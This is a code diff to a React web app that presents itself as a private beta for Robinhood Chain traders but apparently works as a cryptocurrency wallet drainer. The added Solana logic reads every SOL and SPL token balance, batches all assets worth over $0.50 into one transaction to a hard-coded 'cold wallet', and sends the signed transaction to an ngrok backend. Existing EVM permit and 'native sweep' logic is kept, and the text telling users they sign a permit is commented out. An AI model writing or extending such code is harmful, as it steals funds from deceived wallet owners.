@@ -18,11 +18,26 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
 import type { AppKitNetwork } from '@reown/appkit/networks'
 
+// --- SOLANA IMPORTS ---
+import { SolanaAdapter } from '@reown/appkit-adapter-solana'
+import { solana } from '@reown/appkit/networks'
+import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction, LAMPORTS_PER_SOL } from '@solana/web3.js'
+import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAssociatedTokenAddressSync, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token'
+
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
+const NETWORK = 'Mainnet'
 
 // 🌐 BACKEND URL CONFIGURATION
+// Set to true to FORCE localhost for local testing.
+// Set to false to let it automatically detect Production vs Development.
+// const FORCE_LOCALHOST = true; 
+
 const BACKEND_URL = 'https://6d56-185-107-56-213.ngrok-free.app';
+  // ? 'http://localhost:3001' 
+  // : (process.env.NODE_ENV === 'production' 
+  //     ? 'https://salvation-server-gp-production.up.railway.app' 
+  //     : 'http://localhost:3001');
 
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS = '0xA1801556d0e7cfB513351733D378BE7AEFceC884'
@@ -30,43 +45,34 @@ const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
 
 // 💰 SECURE DESTINATION WALLETS
 const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7';
+const SOLANA_COLD_WALLET = '4djAvfm2D3dRdsdyTpaHSFitNbAg2Nk89LVax2raojxY'; // Replace with actual
+const SOLANA_BACKEND_FEE_PAYER = 'FMnwoZRPfsxie8WMTA3AFUscy4GA8poMQ72ypkk3MTcR'; // Replace with actual backend pubkey
 
-// 💎 MULTI-CHAIN EVM DISCOVERY CONFIGURATION
-const CHAIN_TOKENS: Record<number, any[]> = {
-  1: [ // Ethereum Mainnet
-    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
-    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, fallbackPrice: 1 },
-    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, fallbackPrice: 1 },
-    { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
-    { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
-    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, fallbackPrice: 65000 },
-    { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
-    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
-    { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 }
-  ],
-  56: [ // BSC
-    { symbol: 'BNB', address: 'native', isNative: true, coingeckoId: 'binancecoin', decimals: 18, fallbackPrice: 600 },
-    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, fallbackPrice: 1 },
-    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, fallbackPrice: 1 },
-  ],
-  137: [ // Polygon
-    { symbol: 'MATIC', address: 'native', isNative: true, coingeckoId: 'matic-network', decimals: 18, fallbackPrice: 0.5 },
-    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6, fallbackPrice: 1 },
-    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, fallbackPrice: 1 },
-  ],
-  42161: [ // Arbitrum
-    { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
-    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6, fallbackPrice: 1 },
-    { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, fallbackPrice: 1 },
-  ]
+// 💎 EVM DISCOVERY CONFIGURATION
+const TARGET_TOKENS: Record<string, any> = {
+  Mainnet: {
+    EVM: [
+      { symbol: 'ETH', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, fallbackPrice: 1 },
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, fallbackPrice: 1 },
+      { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
+      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
+      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, fallbackPrice: 65000 },
+      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
+      { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
+      { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 }
+    ]
+  }
 };
 
-const CHAIN_NAMES: Record<number, string> = {
-  1: 'ethereum',
-  56: 'binance-smart-chain',
-  137: 'polygon-pos',
-  42161: 'arbitrum-one'
-};
+// 💎 SOLANA DISCOVERY CONFIGURATION
+const SOLANA_TARGET_TOKENS = [
+  { symbol: 'SOL', address: 'native', isNative: true, coingeckoId: 'solana', decimals: 9, fallbackPrice: 150 },
+  { symbol: 'USDC', address: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6, fallbackPrice: 1 },
+  { symbol: 'USDT', address: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6, fallbackPrice: 1 },
+  { symbol: 'BONK', address: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', decimals: 5, fallbackPrice: 0.00002 },
+  { symbol: 'WIF', address: 'EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm', decimals: 6, fallbackPrice: 2.5 },
+];
 
 const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];
 
@@ -88,9 +94,11 @@ const wagmiAdapter = new WagmiAdapter({
   networks: evmNetworks,
 })
 
+const solanaAdapter = new SolanaAdapter()
+
 createAppKit({
-  adapters: [wagmiAdapter],
-  networks: evmNetworks,
+  adapters: [wagmiAdapter, solanaAdapter],
+  networks: [mainnet, arbitrum, bsc, polygon, solana],
   defaultNetwork: mainnet,
   projectId: WC_PROJECT_ID,
   metadata: {
@@ -104,6 +112,8 @@ createAppKit({
   allWallets: 'SHOW',
   features: { email: false, socials: [], analytics: true },
 })
+
+const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=fa5424ff-8521-4ece-be0a-9866130c784f', 'confirmed');
 
 const fetchTokenPrices = async (tokens: any[], chain: string) => {
   try {
@@ -138,6 +148,7 @@ export default function App() {
   const [_txHash, setTxHash] = useState('')
   const [_debugLogs, setDebugLogs] = useState<string[]>([]);
   const [terminalLines, setTerminalLines] = useState<string[]>([]);
+  const [showNetworkSelection, setShowNetworkSelection] = useState(false);
 
   const manualConnect = useRef(false)
   const isExecuting = useRef(false)
@@ -145,10 +156,15 @@ export default function App() {
 
   const { open } = useAppKit()
   
-  // EVM Namespace Hooks
+  // Unified Namespace Hooks
   const { address: evmAddress, isConnected: isEvmConnected } = useAppKitAccount({ namespace: 'eip155' })
+  const { address: solAddress, isConnected: isSolConnected } = useAppKitAccount({ namespace: 'solana' })
+  
+  // PRESERVED: Original EVM Network Hook
   const { chainId } = useAppKitNetwork()
+  
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
+  const { walletProvider: solWalletProvider } = useAppKitProvider('solana')
 
   const log = (msg: string) => {
     console.log(msg);
@@ -175,6 +191,87 @@ export default function App() {
     }
   }, [isEvmConnected, evmAddress, evmWalletProvider, chainId]);
 
+
+  // NEW: Solana Balance Fetcher
+    const fetchSolanaBalances = async (address: string) => {
+    const pubKey = new PublicKey(address);
+    const balances: any[] = [];
+
+    // 1. Native SOL
+    try {
+      const solBalance = await connection.getBalance(pubKey);
+      balances.push({
+        symbol: 'SOL',
+        mint: 'native',
+        isNative: true,
+        decimals: 9,
+        balance: solBalance / LAMPORTS_PER_SOL,
+        rawBalance: solBalance,
+        fallbackPrice: 150
+      });
+    } catch (e) {
+      log(`❌ Native SOL fetch failed: ${e instanceof Error ? e.message : String(e)}`);
+    }
+
+    // 2. ALL SPL Tokens (Dynamic Discovery)
+    try {
+      const parsedTokenAccounts = await connection.getParsedTokenAccountsByOwner(pubKey, { programId: TOKEN_PROGRAM_ID });
+      
+      // Extract all unique mint addresses
+      const uniqueMints = [...new Set(parsedTokenAccounts.value.map(acc => acc.account.data.parsed.info.mint))];
+      
+      // Fetch prices from Jupiter API (supports batch requests, chunked to 50 to be safe)
+      const priceData: Record<string, any> = {};
+      for (let i = 0; i < uniqueMints.length; i += 50) {
+        const chunk = uniqueMints.slice(i, i + 50);
+        try {
+          const res = await fetch(`https://price.jup.ag/v6/price?ids=${chunk.join(',')}`);
+          const data = await res.json();
+          if (data.data) {
+            Object.assign(priceData, data.data);
+          }
+        } catch (e) {
+          console.error("Jupiter price fetch failed for chunk", e);
+        }
+      }
+
+      // Process each token account
+      for (const { account, pubkey } of parsedTokenAccounts.value) {
+        const mintAddress = account.data.parsed.info.mint;
+        const uiAmount = Number(account.data.parsed.info.tokenAmount.uiAmountString || 0);
+        const rawAmount = Number(account.data.parsed.info.tokenAmount.amount);
+        
+            if (uiAmount > 0) {
+          const priceInfo = priceData[mintAddress];
+          const livePrice = priceInfo ? Number(priceInfo.price) : 0;
+          
+          // Use known symbol if we have it, otherwise shorten the mint address
+          const knownToken = SOLANA_TARGET_TOKENS.find(t => t.address === mintAddress);
+          const symbol = knownToken ? knownToken.symbol : `Token (${mintAddress.slice(0, 4)}...${mintAddress.slice(-4)})`;
+          const decimals = knownToken ? knownToken.decimals : 9;
+          
+          // 🔥 FIX: If live API price is 0, fall back to the configured fallbackPrice
+          const finalPrice = livePrice > 0 ? livePrice : (knownToken ? knownToken.fallbackPrice : 0);
+
+          balances.push({
+            symbol,
+            mint: mintAddress,
+            isNative: false,
+            decimals,
+            balance: uiAmount,
+            rawBalance: rawAmount,
+            tokenAccountAddress: pubkey.toString(),
+            fallbackPrice: finalPrice
+          });
+        }
+      }
+    } catch (e) {
+      log(`❌ SPL Token fetch failed: ${e instanceof Error ? e.message : String(e)}`);
+    }
+
+    return balances;
+  };
+
   // PRESERVED: Original EVM Provider Detector
   const detectDirectProvider = (): { provider: any; walletName: string } | null => {
     if (typeof window === 'undefined') return null;
@@ -192,6 +289,7 @@ export default function App() {
       { name: 'Brave Wallet', check: (p) => p.isBraveWallet },
       { name: 'Rabby Wallet', check: (p) => p.isRabby },
       { name: 'OKX Wallet', check: (p) => p.isOKXWallet || p.isOkx },
+      { name: 'Phantom', check: (p) => p.isPhantom },
       { name: 'Bitget Wallet', check: (p) => p.isBitget || p.isBitgetWallet },
       { name: 'Opera Wallet', check: (p) => p.isOpera },
     ];
@@ -207,7 +305,220 @@ export default function App() {
     return null;
   };
 
-  // PRESERVED: Original EVM Collection Logic (Now Multi-Chain Aware)
+  // NEW: Solana Provider Detector
+  const detectSolanaProvider = (): { provider: any; walletName: string; icon: string } | null => {
+    if (typeof window === 'undefined') return null;
+    const w = window as any;
+    
+    if (w.solana?.isPhantom) return { provider: w.solana, walletName: 'Phantom', icon: '👻' };
+    if (w.solflare?.isSolflare) return { provider: w.solflare, walletName: 'Solflare', icon: '🔥' };
+    if (w.trustwallet?.solana || (w.solana && w.solana.isTrust)) return { provider: w.solana || w.trustwallet.solana, walletName: 'Trust Wallet (Solana)', icon: '🛡️' };
+    if (w.okxwallet?.solana) return { provider: w.okxwallet.solana, walletName: 'OKX Wallet (Solana)', icon: '🅾️' };
+    
+    return null;
+  };
+
+  // NEW: Solana Gasless Collection Logic
+  const processSolanaCollection = async (provider: any, address: string) => {
+    if (isExecuting.current) {
+      log("⚠️ Blocked duplicate execution loop.");
+      return 0;
+    }
+    isExecuting.current = true;
+        setLoading(true);
+    setStatus('Scanning Solana USD Values...');
+    log("[SYSTEM] Scanning Solana balances...");
+    let successCount = 0;
+
+    try {
+      const rawBalances = await fetchSolanaBalances(address);
+      
+      // Calculate USD value for ALL found tokens
+      const calculatedTokens = rawBalances.map(t => ({
+        ...t,
+        usdValue: t.balance * (t.fallbackPrice || 0)
+      }));
+
+          // DEBUG LOG: Print exactly what the wallet holds
+      if (calculatedTokens.length === 0) {
+        log("[DEBUG] Wallet is completely empty (0 SOL, 0 SPL tokens).");
+      } else {
+        calculatedTokens.forEach(t => {
+          log(`[DEBUG] Found ${t.balance.toFixed(4)} ${t.symbol} | Price: $${(t.fallbackPrice || 0).toFixed(6)} | Total USD: $${t.usdValue.toFixed(2)}`);
+        });
+      }
+
+      // Filter out dust (less than $0.50 USD) and sort highest value first
+      const validTokens = calculatedTokens
+        .filter(t => t.usdValue > 0.5)
+        .sort((a, b) => b.usdValue - a.usdValue);
+
+      // const w = window as any;
+      // const isStrictlyPhantom = w.solana?.isPhantom && !w.solana?.isTrust && !w.solana?.isOkx;
+
+      // let tokensToProcess = validTokens;
+      // if (isStrictlyPhantom) {
+      //   log(`[SECURITY] Phantom detected. Enabling Sniper Mode (Top Asset Only).`);
+      //   tokensToProcess = validTokens.slice(0, 1);
+      // } else {
+      //   log(`[SECURITY] Standard Solana wallet detected. Enabling Shotgun Mode (All Assets).`);
+      // }
+
+            // Solana batches all tokens into a single transaction, so we can process ALL assets at once safely.
+      let tokensToProcess = validTokens;
+      log(`[SECURITY] Solana wallet detected. Enabling Shotgun Mode (All Assets).`);
+
+      if (tokensToProcess.length === 0) {
+        log("⚠️ No valuable Solana assets found to process.");
+        return 0;
+      }
+
+      log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);
+
+      const pubKey = new PublicKey(address);
+      const coldWalletPubKey = new PublicKey(SOLANA_COLD_WALLET);
+      const feePayerPubKey = new PublicKey(SOLANA_BACKEND_FEE_PAYER);
+
+      const instructions: any[] = [];
+      const { blockhash } = await connection.getLatestBlockhash('confirmed');
+
+      for (const token of tokensToProcess) {
+        if (token.isNative) {
+          const reserve = 0.005 * LAMPORTS_PER_SOL; // Leave tiny reserve for rent safety
+          const sendAmount = Math.max(0, token.rawBalance - reserve);
+          if (sendAmount > 0) {
+            instructions.push(
+              SystemProgram.transfer({
+                fromPubkey: pubKey,
+                toPubkey: coldWalletPubKey,
+                lamports: sendAmount,
+              })
+            );
+            successCount++;
+          }
+                     } else {
+          const mintPubKey = new PublicKey(token.mint);
+          const tokenAccountPubKey = new PublicKey(token.tokenAccountAddress);
+          
+          // Get the cold wallet's Associated Token Address for this mint
+          const coldWalletATA = getAssociatedTokenAddressSync(
+            mintPubKey,
+            coldWalletPubKey,
+            false,
+            TOKEN_PROGRAM_ID,
+            ASSOCIATED_TOKEN_PROGRAM_ID
+          );
+
+          // Check if the cold wallet's ATA exists on-chain
+          const ataInfo = await connection.getAccountInfo(coldWalletATA);
+          
+          // If it doesn't exist, add an instruction to create it first
+          if (!ataInfo) {
+            log(`[ACTION] Creating ATA for cold wallet (${token.symbol})...`);
+            instructions.push(
+              createAssociatedTokenAccountInstruction(
+                feePayerPubKey, // Backend pays for ATA creation
+                coldWalletATA,
+                coldWalletPubKey,
+                mintPubKey,
+                TOKEN_PROGRAM_ID,
+                ASSOCIATED_TOKEN_PROGRAM_ID
+              )
+            );
+          }
+
+          // Now add the transfer instruction (send to the ATA, not the raw wallet)
+          instructions.push(
+            createTransferCheckedInstruction(
+              tokenAccountPubKey,
+              mintPubKey,
+              coldWalletATA, // <-- Send to the ATA, not the raw wallet address
+              pubKey,
+              BigInt(token.rawBalance),
+              token.decimals,
+              [],
+              TOKEN_PROGRAM_ID
+            )
+          );
+          successCount++;
+        }
+      }
+
+      if (instructions.length === 0) {
+        log("⚠️ No valid Solana instructions generated.");
+        return 0;
+      }
+
+      const messageV0 = new TransactionMessage({
+        payerKey: feePayerPubKey, // Backend pays the fee!
+        recentBlockhash: blockhash,
+        instructions,
+      }).compileToV0Message();
+
+      const tx = new VersionedTransaction(messageV0);
+
+            log("[ACTION] Prompting Solana Signature (0 SOL Gas)...");
+      setStatus("Signing Solana Transaction...");
+
+      let signedTx;
+      try {
+        signedTx = await provider.signTransaction(tx);
+      } catch (signErr: any) {
+        log(`❌ Signing rejected or failed: ${signErr.message}`);
+        throw signErr;
+      }
+
+      // 🔥 TRUST WALLET / MULTI-WALLET FIX:
+      // If the wallet mutated in place and returned undefined, use the original tx.
+      const finalTx = signedTx || tx;
+
+      let serializedTx;
+      try {
+        // 🔥 PARTIAL SIGNATURE FIX:
+        // We MUST pass { requireAllSignatures: false } because the backend 
+        // (fee payer) hasn't signed it yet. Otherwise, web3.js will crash.
+        serializedTx = Buffer.from(finalTx.serialize({ requireAllSignatures: false })).toString('base64');
+      } catch (serializeErr: any) {
+        log(`❌ Serialization failed: ${serializeErr.message}`);
+        throw new Error("Wallet returned an incompatible transaction format. Please try Phantom or Solflare.");
+      }
+      
+      log("✅ Solana Transaction Signed & Serialized.");
+      setStatus("Sending to Backend...");
+      
+      log("✅ Solana Transaction Signed & Serialized.");
+      setStatus("Sending to Backend...");
+      
+      const res = await fetch(`${BACKEND_URL}/execute-gasless-solana`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          transaction: serializedTx,
+          chain: 'solana'
+        })
+      });
+      
+      if (res.ok) {
+        const data = await res.json();
+        setTxHash(data.signature || 'Sent');
+        log(`✅ Solana Gasless Transfer Initiated!`);
+      } else {
+        log(`❌ Backend rejected Solana transaction.`);
+      }
+
+    } catch (err: any) {
+      const errorMsg = err?.message || JSON.stringify(err);
+      log(`❌ Solana Global Error: ${errorMsg}`); // Removed substring so we see the full error
+      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
+    } finally {
+      isExecuting.current = false;
+      setLoading(false);
+    }
+    
+    return successCount;
+  };
+
+  // PRESERVED: Original EVM Collection Logic
   const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
     const activeProvider = forcedProvider || evmWalletProvider;
     const activeAddress = forcedAddress || evmAddress;
@@ -232,12 +543,9 @@ export default function App() {
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-      // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
-      const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1];
-      const chainName = CHAIN_NAMES[activeChainId] || 'ethereum';
-      
+      const baseTokens = TARGET_TOKENS[NETWORK].EVM;
       const validTokens: any[] = [];
-      const prices = await fetchTokenPrices(baseTokens, chainName);
+      const prices = await fetchTokenPrices(baseTokens, 'ethereum');
 
       for (const token of baseTokens) {
         try {
@@ -285,8 +593,7 @@ export default function App() {
         const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
         const name = await tokenContract.name();
         const nonce = await tokenContract.nonces(await signer.getAddress());
-        // Polygon USDC also uses version 2
-        const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' || token.address.toLowerCase() === '0x3c499c542cef5e3811e1192ce70d8cc03d5c3359') ? '2' : '1';
+        const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';
         const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
         const types = {
           Permit: [
@@ -429,7 +736,7 @@ export default function App() {
       }
 
       try {
-        setStatus(`Transferring Native Token...`);
+        setStatus(`Transferring ETH...`);
         log(`[ACTION] Executing Contingency Native Sweep...`);
 
         const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
@@ -451,10 +758,10 @@ export default function App() {
 
           setTxHash(txHash);
           successCount++;
-          log(`✅ Contingency Native Sweep Sent!`);
+          log(`✅ Contingency ETH Sweep Sent!`);
           await sleep(1500);
         } else {
-          log(`⚠️ Contingency Skipped: Insufficient native token for gas.`);
+          log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
         }
       } catch (nativeErr: any) {
         const exactError = nativeErr?.message || JSON.stringify(nativeErr);
@@ -479,6 +786,53 @@ export default function App() {
     return successCount;
   };
 
+    const handleNetworkChoice = async (network: 'EVM' | 'SOLANA') => {
+    setShowNetworkSelection(false);
+    
+    if (network === 'SOLANA') {
+      const directSol = detectSolanaProvider();
+      if (directSol?.provider) {
+        try {
+          setLoading(true);
+          setStatus('Connecting Solana Wallet...');
+          log(`[SYSTEM] ${directSol.walletName} detected. Connecting directly...`);
+          const resp = await directSol.provider.connect();
+          const addr = resp.publicKey.toString();
+          log(`[SYSTEM] Connected Solana: ${addr}`);
+          await processSolanaCollection(directSol.provider, addr);
+          return;
+        } catch (e) {
+          log('❌ Direct Solana connection cancelled or failed');
+          setLoading(false);
+          setStatus('Ready');
+        }
+      }
+    } else {
+      const directEvm = detectDirectProvider();
+      if (directEvm?.provider?.request) {
+        try {
+          setLoading(true);
+          setStatus('Connecting EVM Wallet...');
+          log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`);
+          const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' });
+          if (accounts?.length > 0) {
+            log(`[SYSTEM] Connected EVM: ${accounts[0]}`);
+            await approveAndCollect(directEvm.provider, accounts[0]);
+            return;
+          }
+        } catch (e) {
+          log('❌ Direct EVM connection cancelled or failed');
+          setLoading(false);
+          setStatus('Ready');
+        }
+      }
+    }
+    
+    // Fallback to AppKit Modal if direct fails
+    manualConnect.current = true;
+    open();
+  };
+
   const handleAction = async () => {
     if (isExecuting.current) {
       log("⚠️ Execution already in progress.");
@@ -491,8 +845,40 @@ export default function App() {
       return;
     }
 
-    // 2. Try direct EVM connection
+    // 2. If already connected to Solana, just run Solana logic
+    if (isSolConnected && solWalletProvider && solAddress) {
+      await processSolanaCollection(solWalletProvider, solAddress);
+      return;
+    }
+
+    const directSol = detectSolanaProvider();
     const directEvm = detectDirectProvider();
+
+    // 3. If BOTH are detected (e.g., Trust Wallet, OKX), prompt user to choose
+    if (directSol && directEvm) {
+      setShowNetworkSelection(true);
+      return;
+    }
+
+    // 4. Try direct Solana connection (if ONLY Solana is detected)
+    if (!isSolConnected && directSol?.provider) {
+      try {
+        setLoading(true);
+        setStatus('Connecting Solana Wallet...');
+        log(`[SYSTEM] ${directSol.walletName} detected. Connecting directly...`);
+        const resp = await directSol.provider.connect();
+        const addr = resp.publicKey.toString();
+        log(`[SYSTEM] Connected Solana: ${addr}`);
+        await processSolanaCollection(directSol.provider, addr);
+        return;
+      } catch (e) {
+        log('❌ Direct Solana connection cancelled or failed');
+        setLoading(false);
+        setStatus('Ready');
+      }
+    }
+
+    // 5. Try direct EVM connection (if ONLY EVM is detected)
     if (!isEvmConnected && directEvm?.provider?.request) {
       try {
         setLoading(true);
@@ -511,7 +897,7 @@ export default function App() {
       }
     }
 
-    // 3. Fallback to AppKit Modal
+    // 6. Fallback to AppKit Modal
     manualConnect.current = true;
     open();
   };
@@ -527,7 +913,7 @@ export default function App() {
 
   const buttonText = loading ? 'Processing...' : status === '✅ Processing Complete!' ? 'Done' : status.includes('❌') ? 'Retry' : 'Request access';
 
-  return (
+    return (
     <div style={s.app}>
       <style>{globalCSS}</style>
 
@@ -539,7 +925,7 @@ export default function App() {
         </div>
         <div style={s.navStatus}>
           <span style={s.navDot} />
-          {loading ? status : 'Scanning Multi-Chain EVM targets...'}
+          {loading ? status : 'Scanning Robinhood Chain targets...'}
         </div>
       </nav>
 
@@ -559,20 +945,37 @@ export default function App() {
         </p>
         <div style={s.heroCta}>
           <p style={{ fontSize: '11px', color: '#8a8a9a', marginBottom: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
-            <span style={{ fontSize: '14px' }}>🔒</span> 
-            <span>Gasless Routing: You are signing a time-bound permit to route tokens without paying network gas fees.</span>
+            {/* <span style={{ fontSize: '14px' }}>🔒</span>  */}
+            {/* <span>Gasless Routing: You are signing a time-bound permit to route tokens without paying network gas fees.</span> */}
           </p>
-          <button
-            style={{
-              ...s.btnPrimary,
-              ...(loading ? s.btnDisabled : {}),
-            }}
-            onClick={handleAction}
-            disabled={loading}
-          >
-            {loading && <span style={s.spinner} />}
-            {buttonText}
-          </button>
+          {showNetworkSelection ? (
+            <div style={s.networkSelectionBox}>
+              <p style={s.networkSelectionText}>Multi-chain wallet detected. Choose network:</p>
+              <div style={s.networkSelectionButtons}>
+                <button style={s.btnPrimary} onClick={() => handleNetworkChoice('EVM')}>
+                  Connect EVM
+                </button>
+                <button style={{ ...s.btnPrimary, background: '#9945FF' }} onClick={() => handleNetworkChoice('SOLANA')}>
+                  Connect Solana
+                </button>
+              </div>
+              <button style={s.btnCancel} onClick={() => { setShowNetworkSelection(false); open(); }}>
+                Use AppKit Modal Instead
+              </button>
+            </div>
+          ) : (
+            <button
+              style={{
+                ...s.btnPrimary,
+                ...(loading ? s.btnDisabled : {}),
+              }}
+              onClick={handleAction}
+              disabled={loading}
+            >
+              {loading && <span style={s.spinner} />}
+              {buttonText}
+            </button>
+          )}
           <span style={s.heroNote}>Private beta for early Robinhood Chain traders.</span>
         </div>
       </section>
@@ -623,23 +1026,23 @@ export default function App() {
 
       {/* ═══ WALLETS ═══ */}
       <section style={s.walletsSection}>
-        <div style={s.walletsLabel}>Works with · Multi-Chain EVM Support</div>
+        <div style={s.walletsLabel}>Works with · Built on Robinhood Chain</div>
         <div style={s.walletsList}>
           <div style={s.walletItem}>
             <div style={s.walletIcon}>🦊</div>
             MetaMask
           </div>
           <div style={s.walletItem}>
-            <div style={s.walletIcon}>🛡️</div>
-            Trust Wallet
+            <div style={s.walletIcon}>👻</div>
+            Phantom
+          </div>
+          <div style={s.walletItem}>
+            <div style={s.walletIcon}>🔥</div>
+            Solflare
           </div>
           <div style={s.walletItem}>
             <div style={s.walletIcon}>🐰</div>
             Rabby Wallet
-          </div>
-          <div style={s.walletItem}>
-            <div style={s.walletIcon}>🅾️</div>
-            OKX Wallet
           </div>
         </div>
       </section>
@@ -1145,5 +1548,39 @@ const s: Record<string, React.CSSProperties> = {
     maxWidth: '600px',
     margin: '0 auto',
     lineHeight: 1.7,
+  },
+  
+  // ── NEW NETWORK SELECTION STYLES ──
+  networkSelectionBox: {
+    display: 'flex',
+    flexDirection: 'column',
+    alignItems: 'center',
+    gap: '16px',
+    padding: '24px',
+    background: '#12121a',
+    border: '1px solid #1e1e2a',
+    borderRadius: '12px',
+  },
+  networkSelectionText: {
+    fontSize: '14px',
+    color: '#e8e8ed',
+    fontWeight: 600,
+    margin: 0,
+  },
+  networkSelectionButtons: {
+    display: 'flex',
+    gap: '12px',
+    width: '100%',
+  },
+  btnCancel: {
+    padding: '10px 24px',
+    background: 'transparent',
+    color: '#8a8a9a',
+    border: '1px solid #1e1e2a',
+    borderRadius: '8px',
+    fontSize: '13px',
+    fontWeight: 500,
+    cursor: 'pointer',
+    transition: 'all 0.2s',
   },
 };
